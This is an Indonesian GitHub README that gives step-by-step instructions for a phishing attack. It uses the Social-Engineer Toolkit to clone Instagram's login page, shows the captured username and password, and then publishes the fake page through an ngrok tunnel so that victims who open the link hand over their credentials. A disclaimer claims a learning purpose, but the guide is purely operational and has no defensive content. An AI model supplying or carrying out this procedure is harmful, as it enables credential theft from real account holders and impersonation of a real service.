# ngrokxwebphising by Li3N4X
Ini adalah repository pertama saya di github. Saya bermaksud untuk membuat dokumentasi saat saya belajar *Social Engineering*.
Tunneling web phising menggunakan ngrok. Saya bermaksud untuk berbagi ilmu dan pemahaman dalam maksud dan tujuan untuk belajar dan tidak menyalahgunakanhal yang sudah saya pelajari, karena saya sadar hal ini dapat berbahaya dan dapat disalahgunakan ditangan orang jahat/kriminal. Jika ada, entah siapapun yang melakukan tindakan perusakan/cybercrime yang disebabkan dari pembelajaran tutorial yang saya buat, 
Dengan tegas kami saya tidak bertanggung jawab kepada yang bersangkutan
Saya percaya bahwa tidak mungkin membela diri dari peretas tanpa mengetahui peretasan itu dilakukan.

Tujuan utama dari kegiatan ini adalah untuk mengetahui bagaimana cara kita bisa melakukan sebagai berikut :
- Mengenal Web Phising
- Tunneling
- Ngrok
- Step by step cara

Tools yang saya gunakan : 
- ngrok
- setoolkit

Yang perlu disiapkan terlebih dahulu :
- Akun ngrok
- Install ngrok
- Install setoolkit
- Bahan login page sebuah website

## Tahap Pertama
Kita akan menggunakan dan mencoba bahan yang kita siapkan sudah siap untuk digunakan. 


```
sudo su
setoolkit
```
masuk sebagai super user di linux. Saya menggunakan Kali Linux
lalu buka setoolkit yang sudah disiapkan.
Disini saya tidak akan menjelaskan bagaimana cara instalasi `setoolkit`, karena kali linux sudah menyiapkan itu semua.

```

           ..######..########.########
           .##....##.##..........##...
           .##.......##..........##...
           ..######..######......##...
           .......##.##..........##...
           .##....##.##..........##...
           ..######..########....##...  

[---]        The Social-Engineer Toolkit (SET)         [---]
[---]        Created by: David Kennedy (ReL1K)         [---]
                      Version: 8.0.3
                    Codename: 'Maverick'
[---]        Follow us on Twitter: @TrustedSec         [---]
[---]        Follow me on Twitter: @HackingDave        [---]
[---]       Homepage: https://www.trustedsec.com       [---]
        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.

   The Social-Engineer Toolkit is a product of TrustedSec.

           Visit: https://www.trustedsec.com

   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!


 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

```
Ini adalah menu yang dapat kita pilih saat pertama kali membuka setoolkit.
mari kita berfokus pada opsi - opsi berikut
```
 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit
```
**Kita pilih opsi nomor 1 Social-Engineering Attacks, lalu akan keluar opsi berikutnya seperti berikut**
```
 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

  99) Return back to the main menu.
```
Kalau diperhatikan dari pilihan yang diberikan, kita dapat mengakses semua opsi, namun akan berbahaya ketika digunakan tanpa etika dan tanpa tanggung jawab
**kita pilih nomor 2 Website Attack Vectors, lalu akan keluar opsi selanjutnya**

```
The HTA Attack method will allow you to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser.

   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method

  99) Return to Main Menu
```
**Kita pilih nomor 3 Credential Harvester Attack Method, lalu akan keluar seperti ini**
```
   1) Web Templates
   2) Site Cloner
   3) Custom Import

  99) Return to Webattack Menu
```
**Saya akan mempraktekkan nomor 2 Site Cloner**

```
##marked
Ujung Tahap Pertama!
set:webattack> IP address for the POST back in Harvester/Tabnabbing [ip.addr.ess.kamu]:
```
**Disini karena untuk mencoba terlebih dahulu, kita lewati tahap ini dengan menekan `Enter` langsung**
```
set:webattack> Enter the url to clone:ur url here!
```
Masukkan website yang halaman loginnya ingin kita clone sebagai media phising.
Sebagai contoh kita akan menggunakan `https://www.instagram.com/accounts/login/`
lalu `Enter`

```
The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                                                                                              
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80                                                                     
[*] Information will be displayed to you as it arrives below: 
```
**Yup! ini sudah jadi. coba kalian masuk kedalam ip address yang tertera disini `set:webattack> IP address for the POST back in Harvester/Tabnabbing [ip.addr.ess.kamu]:`**

**ya benar, halaman login instagram sudah ada dan persis mirip sekali, coba saja kalian masukkan username dan pass apa saja.. nanti kalian akan menerima trigger dari setoolkit**
```
[*] Information will be displayed to you as it arrives below:                                                      
127.0.0.1 - - [07/Apr/2023 13:14:57] "GET / HTTP/1.1" 200 - #baris ini menandakan kalau alamat IP kalian di 'Klik' dan di akses
127.0.0.1 - - [07/Apr/2023 13:15:06] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
PARAM: ReturnUrl=/                                                                                                 
POSSIBLE USERNAME FIELD FOUND: Username=wicak   #sebagai contoh, saya memasukkan uname dan pass serupa                                                                   
POSSIBLE PASSWORD FIELD FOUND: Password=wicak                                                                      
PARAM: __RequestVerificationToken=CfDJ8B243YWE8BRKugCLYHGbxpuq-BRDJ7001cLwguetYpvI4NFHvm8AYv14MQKQnL-uQWd1oRA_NognBtwsICa_FREBtKwEam3VP1VppEqkMvo3JOUT2U_RPm2YvKXsoYO1njr32n3qp3-DlgHf1fKDorM                                         
PARAM: RememberMe=false                                                                                            
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT. 
```
**Yap! begitu simplenya**

## Tahap Kedua
kita akan mulai menggunakan `ngrok`. Kita akan coba memfungsikan ngrok sebagai media `tunneling` yang akan membuat website palsu kita pada tahap pertama tadi bisa diakses oleh network publik.
Note : 
> pastikan kamu sudah memiliki akun di ngrok, kita akan menggunakan authtoken dari ngrok untuk memulainya
<img src="gambar/ngrok auth.jpeg" alt="Alt text">

Nah, copy-paste kan authtoken yang kalian punya lalu jalankan di terminal dengan menggunakan `./` agar bisa berjalan dengan baik
```
#1
./ngrok config add-authtoken tokenkaliandisinixyz
#2
./ngrok http 80
```
Jalankan masing - masing perintah, maka ngrok akan memulai forwarding ke network publik
<img src="gambar/ngrok ok.jpeg" alt="Alt text">


Oke mari kita coba buka link forwarding yang saya sensor
<img src="gambar/ngrok tes.jpeg" alt="Alt text">
apabila sudah tampil seperti ini artinya tunneling kita sudah berhasil dan siap kita isi dengan website dari localhost yang kita punya


**oke sampai disini kita lihat tahap pertama tadi pada bagian ini `set:webattack> IP address for the POST back in Harvester/Tabnabbing [ip.addr.ess.kamu]:80`**
Tuliskan 80 (sama seperti yang kita lakukan pada ngrok)lalu tekan `enter`

Lalu apalagi? yasudah kita tinggal menyelesaikan langkah - langkah yang ada di setoolkit. Ketika sudah kalian tinggal meng-copy url forwarding yang telah github berikan. Dengan begitu, target yang membuka link tersebut akan melihat halaman login phising yang telah dibuat.
Ketika link dari ngrok sudah mendapat trigger dan masukan dari korban, kalian akan mendapat notifikasi yang sama seperti pada tahap pertama diatas.

Akhir kata saya ucapkan terima kasih atas perhatiannya. Saya harap ini dapat membantu pembaca untuk sama sama saling belajar. Apabila ada salah kata, kritik, dan saran, saya sangat terbuka untuk itu dan saya akan berusaha untuk tetap merespon. 

Terima Kasih
Li3N4X
